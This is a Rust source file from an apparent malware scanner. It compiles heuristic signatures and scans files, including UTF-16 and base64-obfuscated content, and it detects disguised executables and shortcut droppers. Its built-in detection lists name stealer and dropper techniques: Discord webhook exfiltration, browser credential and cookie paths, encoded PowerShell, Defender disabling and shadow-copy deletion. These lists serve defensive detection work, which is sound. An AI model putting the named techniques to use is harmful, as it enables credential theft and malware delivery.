#![allow(unused_imports)]
use crate::state::*;
use rusqlite::{params, Connection};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};
use super::archive_ops::*;
use super::db_cache::*;
use super::fs_ops::*;
use super::path_security::*;

pub fn compute_signatures_version(signatures: &[HeuristicSignature]) -> u64 {
    let mut enabled_rules: Vec<String> = signatures
        .iter()
        .filter(|s| s.enabled)
        .map(|s| {
            format!(
                "{}|{}|{}|{}",
                s.id.trim().to_lowercase(),
                s.match_type.trim().to_lowercase(),
                s.severity.trim().to_lowercase(),
                s.signature.trim().to_lowercase()
            )
        })
        .collect();
    enabled_rules.sort();
    let mut hasher = Sha256::new();
    hasher.update(b"bytehound_engine_v3\n");
    for rule in &enabled_rules {
        hasher.update(rule.as_bytes());
        hasher.update(b"\n");
    }
    let digest = hasher.finalize();
    let mut bytes = [0u8; 8];
    bytes.copy_from_slice(&digest[..8]);
    ((u64::from_le_bytes(bytes)) & 0x0000_FFFF_FFFF_FFFF).max(1)
}

#[derive(Clone, Debug, serde::Serialize, serde::Deserialize)]
pub struct HeuristicMatchDetail {
    pub signature: String,
    pub matched_entry: Option<String>,
    pub detection_type: String,
}

#[derive(Clone)]
pub struct CompiledClause {
    pub rule_idx: usize,
    pub clause_bit: u32,
    pub lower_bytes: Vec<u8>,
    pub symbol_tokens: Vec<Vec<u8>>,
    pub requires_leading_boundary: bool,
    pub requires_trailing_boundary: bool,
    pub requires_no_dot_prefix: bool,
}

#[derive(Clone)]
pub struct CompiledContentRule {
    pub original: String,
    pub required_mask: u32,
    pub clause_count: u8,
    pub explicit_threat_indicator: bool,
}

#[derive(Clone, Default)]
pub struct CompiledSignatures {
    pub is_empty: bool,
    pub file_extensions: Vec<(String, String)>,
    pub file_name_exact: Vec<(String, String)>,
    pub file_name_contains: Vec<(String, String)>,
    pub archive_entry_exact: Vec<(String, String)>,
    pub archive_entry_contains: Vec<(String, String)>,
    pub content_rules: Vec<CompiledContentRule>,
    pub clauses: Vec<CompiledClause>,
    pub by_first_byte: Vec<Vec<usize>>,
}

pub(super) fn is_ident_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

pub(super) fn is_path_sep_byte(b: u8) -> bool {
    b == b'/' || b == b'\\'
}

pub(super) fn extract_effective_extension(name_lower: &str) -> Option<&str> {
    let base = name_lower
        .rsplit(&['/', '\\'][..])
        .next()
        .unwrap_or(name_lower)
        .trim_end_matches(|c: char| c == ' ' || c == '.' || c == '\0');
    let dot_idx = base.rfind('.')?;
    let ext = &base[dot_idx..];
    if ext.len() >= 2 && ext.len() <= 16 {
        Some(ext)
    } else {
        None
    }
}

fn is_bare_dot_extension_pattern(sig_lower: &str) -> bool {
    sig_lower.starts_with('.')
        && sig_lower.len() >= 2
        && sig_lower.len() <= 7
        && sig_lower[1..].bytes().all(|b| b.is_ascii_alphanumeric())
}

fn is_passive_data_extension(ext_lower: &str) -> bool {
    matches!(
        ext_lower,
        ".png"
            | ".jpg"
            | ".jpeg"
            | ".webp"
            | ".gif"
            | ".bmp"
            | ".dds"
            | ".tga"
            | ".ktx"
            | ".ktx2"
            | ".ico"
            | ".svg"
            | ".ogg"
            | ".wav"
            | ".mp3"
            | ".flac"
            | ".wem"
            | ".bnk"
            | ".ttf"
            | ".otf"
            | ".woff"
            | ".woff2"
            | ".txt"
            | ".md"
            | ".rst"
            | ".json"
            | ".xml"
            | ".yaml"
            | ".yml"
            | ".toml"
            | ".ini"
            | ".cfg"
            | ".csv"
            | ".pdf"
            | ".rtf"
            | ".lang"
            | ".strings"
    )
}

fn is_passive_text_extension(ext_lower: &str) -> bool {
    matches!(
        ext_lower,
        ".txt"
            | ".md"
            | ".rst"
            | ".json"
            | ".xml"
            | ".yaml"
            | ".yml"
            | ".toml"
            | ".ini"
            | ".cfg"
            | ".csv"
            | ".lang"
            | ".strings"
    )
}

pub(super) fn is_pe_executable_bytes(bytes: &[u8]) -> bool {
    if bytes.len() < 0x44 || &bytes[0..2] != b"MZ" {
        return false;
    }
    let pe_off = u32::from_le_bytes([bytes[0x3C], bytes[0x3D], bytes[0x3E], bytes[0x3F]]) as usize;
    pe_off >= 0x40
        && pe_off <= 0x4000
        && pe_off + 4 <= bytes.len()
        && &bytes[pe_off..pe_off + 4] == b"PE\0\0"
}

pub(super) fn is_elf_or_macho_bytes(bytes: &[u8]) -> bool {
    if bytes.starts_with(b"\x7FELF") {
        return true;
    }
    if bytes.len() >= 4 {
        let magic = u32::from_be_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]);
        return matches!(magic, 0xFEEDFACE | 0xFEEDFACF | 0xCEFAEDFE | 0xCFFAEDFE);
    }
    false
}

pub(super) fn is_windows_lnk_header(bytes: &[u8]) -> bool {
    bytes.len() >= 20
        && &bytes[0..8] == b"\x4C\x00\x00\x00\x01\x14\x02\x00"
        && &bytes[8..16] == b"\x00\x00\x00\x00\xC0\x00\x00\x00"
        && &bytes[16..20] == b"\x00\x00\x00\x46"
}

pub(super) fn extract_utf16le_ascii_runs(bytes: &[u8], min_chars: usize) -> Vec<u8> {
    let mut out = Vec::new();
    for phase in 0..=1 {
        let mut i = phase;
        let mut run: Vec<u8> = Vec::new();
        while i + 1 < bytes.len() {
            let b = bytes[i];
            let hi = bytes[i + 1];
            if hi == 0 && (b.is_ascii_graphic() || b == b' ') {
                run.push(b);
                i += 2;
            } else {
                if run.len() >= min_chars {
                    out.extend_from_slice(&run);
                    out.push(b'\n');
                }
                run.clear();
                i += 2;
            }
        }
        if run.len() >= min_chars {
            out.extend_from_slice(&run);
            out.push(b'\n');
        }
    }
    out
}

pub(super) fn contains_subslice_ascii_ci(haystack: &[u8], needle_lower: &[u8]) -> bool {
    if needle_lower.is_empty() || haystack.len() < needle_lower.len() {
        return false;
    }
    haystack
        .windows(needle_lower.len())
        .any(|w| w.iter().zip(needle_lower.iter()).all(|(a, b)| a.to_ascii_lowercase() == *b))
}

pub(super) fn check_structural_masquerade(
    entry_name_lower: &str,
    bytes: &[u8],
) -> Option<(String, &'static str)> {
    let ext_opt = extract_effective_extension(entry_name_lower);
    if let Some(ext) = ext_opt {
        if is_passive_data_extension(ext) && (is_pe_executable_bytes(bytes) || is_elf_or_macho_bytes(bytes)) {
            return Some((
                "Disguised Executable Binary (Spoofed Extension)".to_string(),
                "masquerade_executable",
            ));
        }
    }

    if is_windows_lnk_header(bytes) {
        if ext_opt != Some(".lnk") {
            return Some((
                "Disguised Windows Shortcut (.lnk)".to_string(),
                "masquerade_executable",
            ));
        }
        let wide_ascii = extract_utf16le_ascii_runs(bytes, 4);
        let suspicious_lnk_tokens: &[&[u8]] = &[
            b"powershell",
            b"pwsh",
            b"cmd.exe",
            b"/c ",
            b"mshta",
            b"rundll32",
            b"regsvr32",
            b"wscript",
            b"cscript",
            b"certutil",
            b"bitsadmin",
            b"curl ",
            b"http://",
            b"https://",
        ];
        for tok in suspicious_lnk_tokens {
            if contains_subslice_ascii_ci(bytes, tok) || contains_subslice_ascii_ci(&wide_ascii, tok) {
                return Some((
                    "Malicious Windows Shortcut (.lnk) Command Dropper".to_string(),
                    "masquerade_executable",
                ));
            }
        }
    }

    None
}

pub(super) fn is_verified_pure_media_asset(entry_name_lower: &str, bytes: &[u8]) -> bool {
    let Some(ext) = extract_effective_extension(entry_name_lower) else {
        return false;
    };
    let magic_ok = match ext {
        ".png" => bytes.starts_with(b"\x89PNG\r\n\x1A\n"),
        ".jpg" | ".jpeg" => bytes.len() >= 3 && bytes[0] == 0xFF && bytes[1] == 0xD8 && bytes[2] == 0xFF,
        ".webp" => bytes.len() >= 12 && &bytes[0..4] == b"RIFF" && &bytes[8..12] == b"WEBP",
        ".gif" => bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a"),
        ".dds" => bytes.starts_with(b"DDS "),
        ".bmp" => bytes.len() >= 26 && &bytes[0..2] == b"BM" && matches!(bytes[14], 12 | 40 | 52 | 56 | 108 | 124),
        ".ogg" => bytes.starts_with(b"OggS"),
        ".wav" => bytes.len() >= 12 && &bytes[0..4] == b"RIFF" && &bytes[8..12] == b"WAVE",
        ".flac" => bytes.starts_with(b"fLaC"),
        ".bnk" | ".wem" => bytes.starts_with(b"BKHD") || bytes.starts_with(b"RIFF"),
        ".woff" => bytes.starts_with(b"wOFF"),
        ".woff2" => bytes.starts_with(b"wOF2"),
        ".otf" => bytes.starts_with(b"OTTO"),
        ".ttf" => bytes.starts_with(b"\x00\x01\x00\x00"),
        _ => false,
    };
    if !magic_ok {
        return false;
    }
    // Reject polyglot ZIP-appended media containers so hidden zip payloads are still scanned
    let has_embedded_zip = bytes.windows(4).any(|w| w == [0x50, 0x4B, 0x03, 0x04])
        && bytes.windows(4).any(|w| w == [0x50, 0x4B, 0x05, 0x06]);
    !has_embedded_zip
}

pub(super) fn is_binary_or_bytecode_buffer(bytes: &[u8]) -> bool {
    let sample_len = bytes.len().min(8192);
    if sample_len == 0 {
        return false;
    }
    let sample = &bytes[..sample_len];
    if sample.contains(&0) {
        return true;
    }
    let ctl_count = sample
        .iter()
        .filter(|&&b| b < 0x20 && !matches!(b, b'\t' | b'\n' | b'\r' | 0x0C))
        .count();
    ctl_count * 20 > sample_len
}

pub(super) fn extract_printable_ascii_runs(bytes: &[u8], min_chars: usize) -> Vec<u8> {
    let mut out = Vec::new();
    let mut run_start: Option<usize> = None;
    for (idx, &b) in bytes.iter().enumerate() {
        let printable = (0x20..=0x7E).contains(&b) || b == b'\t';
        if printable {
            if run_start.is_none() {
                run_start = Some(idx);
            }
        } else if let Some(s) = run_start {
            if idx - s >= min_chars {
                out.extend_from_slice(&bytes[s..idx]);
                out.push(b'\n');
            }
            run_start = None;
        }
    }
    if let Some(s) = run_start {
        if bytes.len() - s >= min_chars {
            out.extend_from_slice(&bytes[s..]);
            out.push(b'\n');
        }
    }
    out
}

pub(super) fn is_python_bytecode_context(entry_name_lower: &str, bytes: &[u8]) -> bool {
    let ext = extract_effective_extension(entry_name_lower);
    if matches!(ext, Some(".pyc") | Some(".pyo")) {
        return true;
    }
    let sample = &bytes[..bytes.len().min(4096)];
    let has_pyc_header = sample.len() >= 16 && sample[2] == 0x0D && sample[3] == 0x0A;
    if has_pyc_header {
        return true;
    }
    sample.windows(8).any(|w| w == b"__init__")
        || sample.windows(8).any(|w| w == b"<module>")
}

pub(super) fn normalize_sig_bytes(s: &str) -> Vec<u8> {
    let mut out = Vec::with_capacity(s.len());
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i].to_ascii_lowercase();
        if is_path_sep_byte(b) {
            out.push(b'/');
            while i + 1 < bytes.len() && is_path_sep_byte(bytes[i + 1]) {
                i += 1;
            }
        } else {
            out.push(b);
        }
        i += 1;
    }
    out
}

pub(super) fn default_baseline_heuristic_rules() -> Vec<(&'static str, &'static str)> {
    vec![
        ("discord.com/api/webhooks", "file_content_contains"),
        ("discordapp.com/api/webhooks", "file_content_contains"),
        ("api.telegram.org/bot + /send", "file_content_contains"),
        ("Local Storage\\leveldb", "file_content_contains"),
        ("User Data\\Default\\Login Data", "file_content_contains"),
        ("Default\\Network\\Cookies", "file_content_contains"),
        (".ROBLOSECURITY", "file_content_contains"),
        ("CryptUnprotectData", "file_content_contains"),
        ("powershell -enc", "file_content_contains"),
        ("powershell -w hidden", "file_content_contains"),
        ("powershell -windowstyle hidden", "file_content_contains"),
        ("subprocess.Popen( + powershell", "file_content_contains"),
        ("subprocess.Popen( + cmd.exe", "file_content_contains"),
        ("os.system( + powershell", "file_content_contains"),
        ("os.system( + cmd.exe /c", "file_content_contains"),
        ("base64.b64decode( + exec(", "file_content_contains"),
        ("base64.b64decode( + eval(", "file_content_contains"),
        ("zlib.decompress( + exec(", "file_content_contains"),
        ("marshal.loads( + exec(", "file_content_contains"),
        ("urllib.request.urlopen( + exec(", "file_content_contains"),
        ("__import__('os') + system(", "file_content_contains"),
        ("__import__(\"os\") + system(", "file_content_contains"),
        ("WriteProcessMemory + CreateRemoteThread", "file_content_contains"),
        ("URLDownloadToFile", "file_content_contains"),
        ("WScript.Shell", "file_content_contains"),
        ("Net.WebClient + DownloadString(", "file_content_contains"),
        ("DownloadString( + Invoke-Expression", "file_content_contains"),
        ("Invoke-WebRequest + Start-Process", "file_content_contains"),
        ("mshta + http", "file_content_contains"),
        ("regsvr32 + scrobj.dll", "file_content_contains"),
        ("DisableRealtimeMonitoring", "file_content_contains"),
        ("Add-MpPreference + ExclusionPath", "file_content_contains"),
        ("certutil -urlcache", "file_content_contains"),
        ("certutil + -decode", "file_content_contains"),
        ("vssadmin delete shadows", "file_content_contains"),
        ("grabber.py", "file_name_exact"),
        ("stealer.exe", "file_name_exact"),
        (".vbs", "file_extension"),
        (".vbe", "file_extension"),
        (".hta", "file_extension"),
        (".scr", "file_extension"),
        (".pif", "file_extension"),
        (".cpl", "file_extension"),
        (".jse", "file_extension"),
        (".wsf", "file_extension"),
    ]
}

impl CompiledSignatures {
    fn add_rule(&mut self, signature_orig: &str, match_type: &str) {
        let trimmed = signature_orig.trim();
        if trimmed.is_empty() {
            return;
        }
        self.is_empty = false;
        let sig_lower = trimmed.to_lowercase();
        let mt = match_type.trim().to_lowercase();

        let effective_mt = if mt == "file_name_contains" && is_bare_dot_extension_pattern(&sig_lower)
        {
            "file_extension"
        } else {
            mt.as_str()
        };

        match effective_mt {
            "file_extension" => {
                let norm_ext = if sig_lower.starts_with('.') {
                    sig_lower.clone()
                } else {
                    format!(".{}", sig_lower)
                };
                if !self.file_extensions.iter().any(|(s, _)| s == &norm_ext) {
                    self.file_extensions.push((norm_ext, trimmed.to_string()));
                }
            }
            "file_name_exact" => {
                if !self.file_name_exact.iter().any(|(s, _)| s == &sig_lower) {
                    self.file_name_exact.push((sig_lower, trimmed.to_string()));
                }
            }
            "file_name_contains" => {
                if !self.file_name_contains.iter().any(|(s, _)| s == &sig_lower) {
                    self.file_name_contains.push((sig_lower, trimmed.to_string()));
                }
            }
            "archive_entry_exact" => {
                if !self.archive_entry_exact.iter().any(|(s, _)| s == &sig_lower) {
                    self.archive_entry_exact.push((sig_lower, trimmed.to_string()));
                }
            }
            "archive_entry_contains" => {
                if !self.archive_entry_contains.iter().any(|(s, _)| s == &sig_lower) {
                    self.archive_entry_contains.push((sig_lower, trimmed.to_string()));
                }
            }
            _ => {
                if self
                    .content_rules
                    .iter()
                    .any(|r| r.original.eq_ignore_ascii_case(trimmed))
                {
                    return;
                }
                // Support compound heuristic rules joined by " + " or " && "
                let raw_parts: Vec<&str> = sig_lower
                    .split(" + ")
                    .flat_map(|p| p.split(" && "))
                    .map(|p| p.trim())
                    .filter(|p| !p.is_empty())
                    .take(32)
                    .collect();

                if raw_parts.is_empty() || sig_lower == "iwr + iex" {
                    return;
                }

                let normalized_parts: Vec<(String, Vec<u8>)> = raw_parts
                    .iter()
                    .map(|p| ((*p).to_string(), normalize_sig_bytes(p)))
                    .filter(|(_, lb)| !lb.is_empty())
                    .collect();

                let has_tiny_clause = normalized_parts.iter().any(|(_, lb)| lb.len() < 4);
                let single_too_short =
                    normalized_parts.len() == 1 && normalized_parts[0].1.len() < 6;
                let total_len: usize = normalized_parts.iter().map(|(_, lb)| lb.len()).sum();
                let all_short_weak_compound = !normalized_parts.is_empty()
                    && normalized_parts.iter().all(|(_, lb)| lb.len() < 6)
                    && total_len < 9;

                if normalized_parts.is_empty()
                    || has_tiny_clause
                    || single_too_short
                    || all_short_weak_compound
                {
                    return;
                }

                let rule_idx = self.content_rules.len();
                let mut required_mask: u32 = 0;

                for (part_idx, (part, lower_bytes)) in normalized_parts.into_iter().enumerate() {
                    let clause_bit = 1u32 << part_idx;
                    required_mask |= clause_bit;

                    let symbol_tokens: Vec<Vec<u8>> = if part.contains('.')
                        || part.contains('(')
                        || part.contains('/')
                        || part.contains('\\')
                        || part.contains(' ')
                        || part.contains('-')
                    {
                        part.split(|c: char| !c.is_ascii_alphanumeric() && c != '_')
                            .filter(|t| t.len() >= 2)
                            .map(|t| t.as_bytes().to_vec())
                            .collect()
                    } else {
                        Vec::new()
                    };

                    // Require identifier word boundaries around short tokens and code symbols so
                    // substrings like `chaos.system(` or random 3-5 byte fragments cannot false-positive.
                    let is_symbol_pattern = !lower_bytes.starts_with(b"/")
                        && (lower_bytes.contains(&b'(')
                            || lower_bytes.contains(&b'.')
                            || lower_bytes.contains(&b':'));
                    let requires_leading_boundary = is_ident_byte(lower_bytes[0])
                        && (is_symbol_pattern
                            || lower_bytes.ends_with(b"(")
                            || lower_bytes.len() <= 5
                            || lower_bytes.contains(&b' '));
                    let requires_trailing_boundary = is_ident_byte(*lower_bytes.last().unwrap_or(&0))
                        && lower_bytes.len() <= 5
                        && lower_bytes.as_slice() != b"http"
                        && !lower_bytes.starts_with(b"/")
                        && !lower_bytes.contains(&b'.')
                        && !lower_bytes.contains(&b'(')
                        && !lower_bytes.contains(&b'-');
                    let requires_no_dot_prefix =
                        lower_bytes.contains(&b'.') && !lower_bytes.starts_with(b"net.");

                    let clause_idx = self.clauses.len();
                    let first_b = lower_bytes[0] as usize;
                    self.by_first_byte[first_b].push(clause_idx);
                    if first_b == (b'/' as usize) {
                        self.by_first_byte[b'\\' as usize].push(clause_idx);
                    }
                    self.clauses.push(CompiledClause {
                        rule_idx,
                        clause_bit,
                        lower_bytes,
                        symbol_tokens,
                        requires_leading_boundary,
                        requires_trailing_boundary,
                        requires_no_dot_prefix,
                    });
                }

                if required_mask != 0 {
                    let clause_count = required_mask.count_ones() as u8;
                    let explicit_threat_indicator = sig_lower.contains("discord")
                        || sig_lower.contains("telegram")
                        || sig_lower.contains("roblosecurity")
                        || sig_lower.contains("login data")
                        || sig_lower.contains("leveldb")
                        || sig_lower.contains("network\\cookies")
                        || sig_lower.contains("network/cookies")
                        || sig_lower.contains("powershell -enc")
                        || sig_lower.contains("powershell -w hidden")
                        || sig_lower.contains("vssadmin delete");
                    self.content_rules.push(CompiledContentRule {
                        original: trimmed.to_string(),
                        required_mask,
                        clause_count,
                        explicit_threat_indicator,
                    });
                }
            }
        }
    }

    pub fn new(signatures: &[HeuristicSignature]) -> Self {
        let mut compiled = CompiledSignatures {
            is_empty: true,
            file_extensions: Vec::new(),
            file_name_exact: Vec::new(),
            file_name_contains: Vec::new(),
            archive_entry_exact: Vec::new(),
            archive_entry_contains: Vec::new(),
            content_rules: Vec::new(),
            clauses: Vec::new(),
            by_first_byte: vec![Vec::new(); 256],
        };

        let mut disabled_sigs = std::collections::HashSet::new();
        for sig in signatures {
            if !sig.enabled {
                disabled_sigs.insert(sig.signature.trim().to_lowercase());
                continue;
            }
            let sev = sig.severity.trim();
            if !sev.is_empty()
                && !sev.eq_ignore_ascii_case("malware")
                && !sev.eq_ignore_ascii_case("critical")
                && !sev.eq_ignore_ascii_case("high")
            {
                continue;
            }
            compiled.add_rule(&sig.signature, &sig.match_type);
        }

        for (base_sig, base_type) in default_baseline_heuristic_rules() {
            if !disabled_sigs.contains(&base_sig.to_lowercase()) {
                compiled.add_rule(base_sig, base_type);
            }
        }

        compiled
    }
}

pub(super) fn match_normalized_ascii_at(buffer: &[u8], start: usize, pattern: &[u8]) -> Option<usize> {
    let mut b_idx = start;
    let mut p_idx = 0;
    while p_idx < pattern.len() {
        if b_idx >= buffer.len() {
            return None;
        }
        let pb = pattern[p_idx];
        let bb = buffer[b_idx].to_ascii_lowercase();
        if pb == b'/' {
            if !is_path_sep_byte(bb) {
                return None;
            }
            b_idx += 1;
            // Collapse escaped double backslashes or repeated slashes in source/JSON/binary
            while b_idx < buffer.len() && is_path_sep_byte(buffer[b_idx]) {
                b_idx += 1;
            }
            p_idx += 1;
        } else {
            if bb != pb {
                return None;
            }
            b_idx += 1;
            p_idx += 1;
        }
    }
    Some(b_idx)
}

pub(super) fn decode_base64_slice(input: &[u8]) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity((input.len() * 3) / 4);
    let mut buf: u32 = 0;
    let mut bits: u8 = 0;
    for &b in input {
        let val = match b {
            b'A'..=b'Z' => b - b'A',
            b'a'..=b'z' => b - b'a' + 26,
            b'0'..=b'9' => b - b'0' + 52,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            b'=' => break,
            b' ' | b'\r' | b'\n' | b'\t' => continue,
            _ => return None,
        };
        buf = (buf << 6) | (val as u32);
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push(((buf >> bits) & 0xFF) as u8);
        }
    }
    if out.len() >= 12 {
        Some(out)
    } else {
        None
    }
}

pub(super) fn hex_nibble(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

pub(super) fn rule_allowed_for_entry_context(
    rule: &CompiledContentRule,
    passive_text_context: bool,
) -> bool {
    if !passive_text_context {
        return true;
    }
    rule.clause_count >= 2 || rule.explicit_threat_indicator
}

pub(super) fn scan_raw_buffer_core(
    buffer: &[u8],
    compiled: &CompiledSignatures,
    rule_masks: &mut [u32],
    passive_text_context: bool,
) -> Option<(String, &'static str)> {
    if buffer.is_empty() || compiled.clauses.is_empty() {
        return None;
    }

    let buf_len = buffer.len();

    // 1 & 2. Single-pass zero-allocation ASCII/UTF-8 (with path separator normalization) + UTF-16LE wide-string scan
    for i in 0..buf_len {
        let b0_lower = buffer[i].to_ascii_lowercase();
        let candidates = &compiled.by_first_byte[b0_lower as usize];
        if candidates.is_empty() {
            continue;
        }

        let is_wide_candidate = i + 1 < buf_len && buffer[i + 1] == 0;

        for &clause_idx in candidates {
            let clause = &compiled.clauses[clause_idx];
            if (rule_masks[clause.rule_idx] & clause.clause_bit) != 0 {
                continue;
            }
            let rule_meta = &compiled.content_rules[clause.rule_idx];
            if !rule_allowed_for_entry_context(rule_meta, passive_text_context) {
                continue;
            }
            let sb = &clause.lower_bytes;
            let slen = sb.len();

            let ascii_leading_ok = !clause.requires_leading_boundary
                || i == 0
                || (!is_ident_byte(buffer[i - 1])
                    && (!clause.requires_no_dot_prefix || buffer[i - 1] != b'.'));

            if i + slen <= buf_len && ascii_leading_ok {
                if let Some(end_idx) = match_normalized_ascii_at(buffer, i, sb) {
                    let ascii_trailing_ok = !clause.requires_trailing_boundary
                        || end_idx >= buf_len
                        || !is_ident_byte(buffer[end_idx]);
                    if ascii_trailing_ok {
                        rule_masks[clause.rule_idx] |= clause.clause_bit;
                        if rule_masks[clause.rule_idx] == rule_meta.required_mask {
                            return Some((rule_meta.original.clone(), "heuristic_content"));
                        }
                        continue;
                    }
                }
            }

            // Check UTF-16LE wide-string match in-place
            let wide_leading_ok = !clause.requires_leading_boundary
                || i < 2
                || (!is_ident_byte(buffer[i - 2])
                    && (!clause.requires_no_dot_prefix || buffer[i - 2] != b'.'));

            if is_wide_candidate && i + slen * 2 <= buf_len && wide_leading_ok {
                let last_pos = i + (slen - 1) * 2;
                let last_b = buffer[last_pos].to_ascii_lowercase();
                let last_ok = if sb[slen - 1] == b'/' {
                    is_path_sep_byte(last_b)
                } else {
                    last_b == sb[slen - 1]
                };
                if last_ok && buffer[last_pos + 1] == 0 {
                    let mut wide_matched = true;
                    for k in 1..(slen.saturating_sub(1)) {
                        let pos = i + k * 2;
                        let cb = buffer[pos].to_ascii_lowercase();
                        let char_ok = if sb[k] == b'/' {
                            is_path_sep_byte(cb)
                        } else {
                            cb == sb[k]
                        };
                        if !char_ok || buffer[pos + 1] != 0 {
                            wide_matched = false;
                            break;
                        }
                    }
                    if wide_matched {
                        let wide_end_idx = i + slen * 2;
                        let wide_trailing_ok = !clause.requires_trailing_boundary
                            || wide_end_idx + 1 >= buf_len
                            || !(buffer[wide_end_idx + 1] == 0
                                && is_ident_byte(buffer[wide_end_idx]));
                        if wide_trailing_ok {
                            rule_masks[clause.rule_idx] |= clause.clause_bit;
                            if rule_masks[clause.rule_idx] == rule_meta.required_mask {
                                return Some((rule_meta.original.clone(), "heuristic_content"));
                            }
                        }
                    }
                }
            }
        }
    }

    None
}

// 3. Python Bytecode / Marshal Symbol-Chain & Token-Proximity Inspection
pub(super) fn scan_bytecode_symbol_chains(
    buffer: &[u8],
    compiled: &CompiledSignatures,
    rule_masks: &mut [u32],
    passive_text_context: bool,
) -> Option<(String, &'static str)> {
    let buf_len = buffer.len();
    if buf_len == 0 || buf_len > 4 * 1024 * 1024 || compiled.clauses.is_empty() {
        return None;
    }
    let has_token_clauses = compiled
        .clauses
        .iter()
        .any(|c| (rule_masks[c.rule_idx] & c.clause_bit) == 0 && c.symbol_tokens.len() >= 2);
    if !has_token_clauses {
        return None;
    }

    let lower_buf: Vec<u8> = buffer.iter().map(|b| b.to_ascii_lowercase()).collect();
    let mut tokens_with_pos: Vec<(&[u8], usize, usize)> = Vec::new();
    let mut start = None;
    for (idx, &b) in lower_buf.iter().enumerate() {
        if is_ident_byte(b) {
            if start.is_none() {
                start = Some(idx);
            }
        } else if let Some(s) = start {
            if idx - s >= 2 {
                tokens_with_pos.push((&lower_buf[s..idx], s, idx));
            }
            start = None;
        }
    }
    if let Some(s) = start {
        if lower_buf.len() - s >= 2 {
            tokens_with_pos.push((&lower_buf[s..], s, lower_buf.len()));
        }
    }

    for clause in &compiled.clauses {
        if (rule_masks[clause.rule_idx] & clause.clause_bit) != 0 {
            continue;
        }
        let rule_meta = &compiled.content_rules[clause.rule_idx];
        if !rule_allowed_for_entry_context(rule_meta, passive_text_context) {
            continue;
        }
        let has_specific_tok = clause.symbol_tokens.iter().any(|tok| tok.len() >= 5);
        let min_tok_len = if has_specific_tok && clause.symbol_tokens.len() >= 3 {
            3
        } else {
            2
        };
        if clause.symbol_tokens.len() >= min_tok_len
            && (clause.symbol_tokens.len() >= 3 || has_specific_tok || clause.lower_bytes.contains(&b'.'))
        {
            let gap_limit = if clause.symbol_tokens.len() >= 3 { 64 } else { 24 };
            let first_tok = clause.symbol_tokens[0].as_slice();
            for (i, &(tok, _, end_pos)) in tokens_with_pos.iter().enumerate() {
                if tok != first_tok {
                    continue;
                }
                let mut prev_end = end_pos;
                let mut chain_idx = 1;
                for &(next_tok, next_start, next_end) in &tokens_with_pos[(i + 1)..] {
                    if next_start.saturating_sub(prev_end) > gap_limit {
                        break;
                    }
                    if next_tok == clause.symbol_tokens[chain_idx].as_slice() {
                        chain_idx += 1;
                        prev_end = next_end;
                        if chain_idx == clause.symbol_tokens.len() {
                            rule_masks[clause.rule_idx] |= clause.clause_bit;
                            if rule_masks[clause.rule_idx] == rule_meta.required_mask {
                                return Some((
                                    rule_meta.original.clone(),
                                    "heuristic_bytecode_chain",
                                ));
                            }
                            break;
                        }
                    }
                }
                if (rule_masks[clause.rule_idx] & clause.clause_bit) != 0 {
                    break;
                }
            }
        }
    }

    None
}

// 4. Plain-Text Deobfuscation Layer (Caret/Backtick, Base64/UTF-16LE, Hex \xNN)
pub(super) fn scan_text_obfuscation_layers(
    text_buf: &[u8],
    compiled: &CompiledSignatures,
    passive_text_context: bool,
) -> Option<(String, &'static str)> {
    if text_buf.is_empty() {
        return None;
    }

    // 4A. CMD Caret (`^`) & PowerShell Backtick (`` ` ``) Escape Deobfuscation Layer
    let sample_len = text_buf.len().min(512 * 1024);
    if text_buf[..sample_len].iter().any(|&b| b == b'^' || b == b'`') {
        let mut stripped = Vec::with_capacity(sample_len);
        for &b in &text_buf[..sample_len] {
            if b != b'^' && b != b'`' {
                stripped.push(b);
            }
        }
        let mut caret_masks = vec![0u32; compiled.content_rules.len()];
        if let Some((sig, _)) =
            scan_raw_buffer_core(&stripped, compiled, &mut caret_masks, passive_text_context)
        {
            return Some((sig, "heuristic_deobfuscated_payload"));
        }
    }

    // 4B. Embedded Base64 payloads (UTF-8 and PowerShell UTF-16LE) — isolated masks per chunk
    let max_obf_scan = std::cmp::min(text_buf.len(), 1024 * 1024);
    let mut idx = 0;
    let mut b64_checked = 0usize;
    while idx < max_obf_scan && b64_checked < 48 {
        let b = text_buf[idx];
        let is_b64_char =
            b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'-' || b == b'_';
        if is_b64_char {
            let start = idx;
            while idx < max_obf_scan {
                let c = text_buf[idx];
                if c.is_ascii_alphanumeric()
                    || c == b'+'
                    || c == b'/'
                    || c == b'-'
                    || c == b'_'
                    || c == b'='
                {
                    idx += 1;
                } else {
                    break;
                }
            }
            let run_len = idx - start;
            if (16..=16384).contains(&run_len) {
                let slice = &text_buf[start..idx];
                let has_mixed = slice.iter().any(|c| c.is_ascii_uppercase())
                    && slice.iter().any(|c| c.is_ascii_lowercase());
                if has_mixed || slice.ends_with(b"=") {
                    b64_checked += 1;
                    if let Some(decoded) = decode_base64_slice(slice) {
                        let mut b64_masks = vec![0u32; compiled.content_rules.len()];
                        if !is_binary_or_bytecode_buffer(&decoded) {
                            if let Some((sig, _)) =
                                scan_raw_buffer_core(&decoded, compiled, &mut b64_masks, false)
                            {
                                return Some((sig, "heuristic_deobfuscated_payload"));
                            }
                        } else {
                            let ascii_decoded = extract_printable_ascii_runs(&decoded, 10);
                            if !ascii_decoded.is_empty() {
                                if let Some((sig, _)) = scan_raw_buffer_core(
                                    &ascii_decoded,
                                    compiled,
                                    &mut b64_masks,
                                    false,
                                ) {
                                    return Some((sig, "heuristic_deobfuscated_payload"));
                                }
                            }
                        }
                        let wide_decoded = extract_utf16le_ascii_runs(&decoded, 6);
                        if !wide_decoded.is_empty() {
                            if let Some((sig, _)) =
                                scan_raw_buffer_core(&wide_decoded, compiled, &mut b64_masks, false)
                            {
                                return Some((sig, "heuristic_deobfuscated_payload"));
                            }
                        }
                    }
                }
            }
        } else {
            idx += 1;
        }
    }

